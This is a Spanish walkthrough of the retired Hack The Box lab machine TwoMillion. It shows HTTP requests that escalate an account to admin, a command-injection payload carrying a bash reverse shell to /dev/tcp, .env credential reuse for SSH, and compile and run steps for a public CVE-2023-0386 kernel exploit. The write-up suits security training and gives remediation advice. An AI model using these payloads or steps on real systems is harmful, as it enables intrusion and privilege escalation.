# Hack The Box: TwoMillion — Walkthrough en español

**Autor:** Garbox0  
**Plataforma:** Hack The Box  
**Dificultad:** Easy  
**Sistema:** Linux  
**Estado:** Retirada

> Todas las pruebas se realizaron sobre una instancia autorizada de Hack The Box. Las flags, cookies, credenciales, direcciones temporales y datos de registro fueron redactados.

## Resumen

TwoMillion recrea una versión antigua de la plataforma Hack The Box. La cadena de ataque consiste en:

1. Enumerar los servicios expuestos.
2. Analizar el mecanismo de invitaciones y crear una cuenta.
3. Enumerar una API que publica sus propias rutas.
4. Modificar el atributo administrativo de la cuenta.
5. Explotar una inyección de comandos en la generación de VPN.
6. Recuperar credenciales desde un archivo `.env` y reutilizarlas en SSH.
7. Escalar privilegios mediante CVE-2023-0386 en OverlayFS.

## 1. Reconocimiento

Comencé con un escaneo completo de puertos TCP:

```bash
nmap -p- --min-rate 2000 -T4 -Pn -oA evidence/tcp-allports 10.129.X.X
```

Los únicos puertos abiertos fueron:

```text
22/tcp  open  ssh
80/tcp  open  http
```

La aplicación web redirigía al hostname `2million.htb`, por lo que lo añadí a `/etc/hosts` dentro de WSL:

```text
10.129.X.X  2million.htb
```

## 2. Sistema de invitaciones

La página `/invite` cargaba JavaScript relacionado con la generación de invitaciones. Al inspeccionar los recursos del sitio y desofuscar el archivo correspondiente, apareció una llamada a:

```text
/api/v1/invite/how/to/generate
```

La respuesta contenía instrucciones codificadas. Después de aplicar ROT13, la aplicación indicaba que debía enviarse una petición `POST` a:

```http
POST /api/v1/invite/generate HTTP/1.1
Host: 2million.htb
```

El valor devuelto por el servidor estaba codificado en Base64. Lo decodifiqué y utilicé el resultado como código de invitación para registrar una cuenta.

El punto importante no era adivinar un código: el propio frontend revelaba el flujo interno de la API.

## 3. Enumeración de la API

Después de autenticarme, consulté:

```http
GET /api/v1 HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=[REDACTADO]
```

La respuesta publicaba el catálogo completo de endpoints. Entre las rutas administrativas destacaban:

```text
GET  /api/v1/admin/auth
POST /api/v1/admin/vpn/generate
PUT  /api/v1/admin/settings/update
```

Al consultar `/api/v1/admin/auth`, el servidor confirmó que mi cuenta todavía no era administradora.

## 4. Elevación de permisos dentro de la aplicación

Envié la petición de actualización desde Burp Repeater. Primero omití parámetros para observar los mensajes de validación del servidor. Estos revelaron los campos esperados: `email` e `is_admin`.

La petición final fue:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=[REDACTADO]
Content-Type: application/json

{
  "email": "[CORREO_REGISTRADO]",
  "is_admin": 1
}
```

La respuesta devolvió el usuario con `is_admin: 1`. Una nueva consulta a `/api/v1/admin/auth` respondió:

```json
{"message": true}
```

La vulnerabilidad es una falla de control de acceso: el backend confía en un atributo enviado por el propio usuario y permite que una cuenta normal modifique su rol.

## 5. Inyección de comandos

El endpoint administrativo de generación de VPN esperaba un nombre de usuario:

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=[REDACTADO]
Content-Type: application/json

{"username":"Garbox0"}
```

Para comprobar si el valor llegaba a una shell del sistema, añadí un separador y el comando `id`:

```json
{"username":"Garbox0;id;"}
```

La respuesta incluyó:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Esto confirmó una inyección de comandos: el servidor concatenaba la entrada del usuario dentro de un comando del sistema sin validarla ni escaparla.

Luego inicié un listener en mi equipo:

```bash
rlwrap nc -lvnp 4444
```

Y adapté la inyección para ejecutar una reverse shell hacia mi IP de la VPN:

```json
{
  "username": "Garbox0;bash -c 'bash -i >& /dev/tcp/[MI_IP_VPN]/4444 0>&1';"
}
```

La conexión entrante proporcionó una shell como `www-data`.

## 6. Acceso como usuario `admin`

En la raíz de la aplicación encontré un archivo `.env`:

```bash
cd /var/www/html
ls -la
cat .env
```

El archivo contenía credenciales de la base de datos. La contraseña estaba reutilizada por el usuario local `admin`, lo que permitió acceder mediante SSH:

```bash
ssh admin@10.129.X.X
```

Con este usuario fue posible leer `/home/admin/user.txt`. La flag no se incluye en este documento.

La causa raíz de este paso es la reutilización de credenciales: un secreto de aplicación también funcionaba como contraseña de una cuenta del sistema.

## 7. Enumeración para la escalada local

El correo local de `admin` contenía una advertencia sobre una vulnerabilidad reciente de OverlayFS. Verifiqué la versión del kernel:

```bash
uname -r
```

La máquina utilizaba un kernel vulnerable a **CVE-2023-0386**. También confirmé que los espacios de nombres de usuario estaban disponibles:

```bash
unshare -Ur id
```

La salida mostraba `uid=0` dentro del namespace. Esto no significaba ser root en el host; confirmaba que el mecanismo necesario para preparar el exploit estaba habilitado.

Después comprobé la presencia de FUSE, OverlayFS y las herramientas de compilación:

```bash
command -v gcc make fusermount fusermount3
grep '^CONFIG_OVERLAY_FS=' /boot/config-$(uname -r) 2>/dev/null
find /lib/modules/$(uname -r) -name 'overlay.ko*' 2>/dev/null
```

## 8. Escalada con CVE-2023-0386

Utilicé el PoC público de `xkaneiki/CVE-2023-0386`. Como el objetivo no resolvía GitHub, descargué el repositorio en mi equipo y transferí un archivo comprimido al objetivo.

Una vez extraído el código en `/tmp`, revisé su `Makefile` antes de compilar. En esta instancia fue necesario indicar explícitamente a GCC dónde encontrar el linker:

```bash
gcc -B/usr/bin/ fuse.c -o fuse \
  -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl

gcc -B/usr/bin/ exp.c -o exp -lcap
gcc -B/usr/bin/ getshell.c -o gc
```

El exploit utiliza una combinación de namespaces, FUSE y OverlayFS para copiar un archivo preservando metadatos privilegiados. El error del kernel permite que el binario auxiliar conserve el bit SUID y termine ejecutándose como root.

Ejecuté primero el componente FUSE y después el disparador:

```bash
./fuse ./ovlcap/lower ./gc &
sleep 2
./exp
```

La comprobación final devolvió:

```text
uid=0(root) gid=0(root)
```

Con privilegios de root fue posible leer `/root/root.txt`. La flag se omite intencionalmente.

## 9. Ruta alternativa: Looney Tunables

La versión de glibc instalada también era vulnerable a **CVE-2023-4911**, conocida como *Looney Tunables*. Esta vulnerabilidad afecta al procesamiento de la variable de entorno:

```text
GLIBC_TUNABLES
```

No utilicé esta ruta porque la escalada mediante CVE-2023-0386 ya había sido validada.

## Causas raíz

1. Exposición excesiva de rutas internas mediante el catálogo de la API.
2. Control de acceso roto al permitir que el usuario modificara `is_admin`.
3. Inyección de comandos en la generación administrativa de VPN.
4. Credenciales sensibles almacenadas en `.env` y reutilizadas en el sistema.
5. Kernel desactualizado y vulnerable a una escalada local conocida.

## Recomendaciones

- Aplicar autorización en el servidor para cada operación administrativa.
- No aceptar atributos de rol desde datos controlados por el cliente.
- Sustituir la ejecución de comandos por APIs seguras sin invocar una shell.
- Validar entradas mediante listas permitidas cuando una entrada llegue al sistema operativo.
- Proteger los archivos de configuración y utilizar secretos distintos para cada servicio.
- Actualizar el kernel y glibc a versiones corregidas.
- Registrar y alertar sobre cambios de rol, generación anómala de VPN y ejecución inesperada de procesos desde el servidor web.

## Conclusión

TwoMillion presenta una cadena clara donde varios errores pequeños se acumulan: información excesiva en la API, autorización débil, inyección de comandos, reutilización de contraseñas y un kernel sin actualizar. La lección principal es que una vulnerabilidad rara vez queda aislada; su impacto aumenta cuando puede encadenarse con controles deficientes en otras capas.

## Referencias

- [Hack The Box — TwoMillion](https://www.hackthebox.com/machines/twomillion)
- [Ubuntu Security — CVE-2023-0386](https://ubuntu.com/security/CVE-2023-0386)
- [PoC público de CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386)
- [Qualys — Looney Tunables (CVE-2023-4911)](https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables.txt)


